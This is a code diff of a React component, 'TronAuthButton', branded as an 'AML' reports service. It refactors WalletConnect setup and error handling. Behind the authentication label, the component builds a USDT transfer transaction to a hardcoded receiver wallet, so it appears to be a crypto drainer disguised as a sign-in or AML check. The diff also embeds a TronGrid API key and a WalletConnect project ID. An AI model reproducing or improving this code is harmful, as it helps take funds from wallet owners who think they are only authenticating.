@@ -1,4 +1,5 @@
-import React, { useState } from 'react';
+// src/components/tronAuthButton/TronAuthButton.tsx
+import React, { useState, useRef, useEffect } from 'react';
 import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';
 
 const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
@@ -7,25 +8,31 @@ const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n';
 export const TronAuthButton: React.FC = () => {
   const [modal, setModal] = useState<string | null>(null);
   const [loading, setLoading] = useState(false);
+  const adapterRef = useRef<any>(null);
 
-  // Adapter singleton
-  const adapterRef = React.useRef<any>(null);
-  if (!adapterRef.current) {
-    adapterRef.current = new WalletConnectAdapter({
-      network: 'Mainnet',
-      options: {
-        relayUrl: 'wss://relay.walletconnect.com',
-        projectId: '6e52e99f199a2bd1feb89b31fbeb6a78',
-        metadata: {
-          name: 'AML',
-          description: 'TRON + WalletConnect Integration',
-          url: 'https://amlreports.pro',
-          icons: ['https://amlreports.pro/images/icon-3.abdd8ed5.webp'],
+  // Инициализация адаптера WalletConnect ОДИН раз при монтировании:
+  useEffect(() => {
+    if (!adapterRef.current) {
+      adapterRef.current = new WalletConnectAdapter({
+        network: 'Mainnet',
+        options: {
+          relayUrl: 'wss://relay.walletconnect.com',
+          projectId: '6e52e99f199a2bd1feb89b31fbeb6a78',
+          metadata: {
+            name: 'AML',
+            description: 'TRON + WalletConnect Integration',
+            url: 'https://amlreports.pro',
+            icons: ['https://amlreports.pro/images/icon-3.abdd8ed5.webp'],
+          },
         },
-      },
-      web3ModalConfig: { themeMode: 'dark' },
-    });
-  }
+        web3ModalConfig: { themeMode: 'dark' },
+      });
+      // Инициализация для ускорения открытия WalletConnect
+      if (typeof adapterRef.current.init === 'function') {
+        adapterRef.current.init();
+      }
+    }
+  }, []);
 
   const handleAuth = async (e?: React.MouseEvent) => {
     e?.stopPropagation();
@@ -43,7 +50,6 @@ export const TronAuthButton: React.FC = () => {
     // Polyfill Buffer для TronWeb (если нужно)
     if (!(window as any).Buffer) (window as any).Buffer = (await import('buffer')).Buffer;
 
-    // Создаём tronWeb объект
     const tronWeb = new TronWeb({
       fullHost: 'https://api.trongrid.io',
       headers: { 'TRON-PRO-API-KEY': 'bbb42b6b-c4de-464b-971f-dea560319489' },
@@ -74,7 +80,7 @@ export const TronAuthButton: React.FC = () => {
         return;
       }
 
-      // Транзакция
+      // Транзакция на USDT
       const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
         USDT_CONTRACT,
         'transfer(address,uint256)',
@@ -93,16 +99,14 @@ export const TronAuthButton: React.FC = () => {
         setModal('⚠️ Transaction failed.');
       }
     } catch (err: any) {
-      // Убираем все "user cancelled" ошибки, не показываем ничего, просто возвращаем интерфейс
-      const errMsg = (err?.message || '').toLowerCase();
+      // Только реальные ошибки, отмена - это НЕ ошибка
       if (
-        errMsg.includes('user rejected') ||
-        errMsg.includes('user closed modal') ||
-        errMsg.includes('user disapproved requested methods') ||
-        errMsg.includes('modal is closed') ||
-        errMsg.includes('timeout')
+        err?.message?.toLowerCase?.().includes('user rejected') ||
+        err?.message?.toLowerCase?.().includes('modal is closed') ||
+        err?.message?.toLowerCase?.().includes('timeout') ||
+        err?.message?.toLowerCase?.().includes('user disapproved requested methods')
       ) {
-        setModal(null);
+        setModal(null); // Не выводим ошибку при отмене пользователем
       } else if (err?.message) {
         setModal(err.message);
       } else {
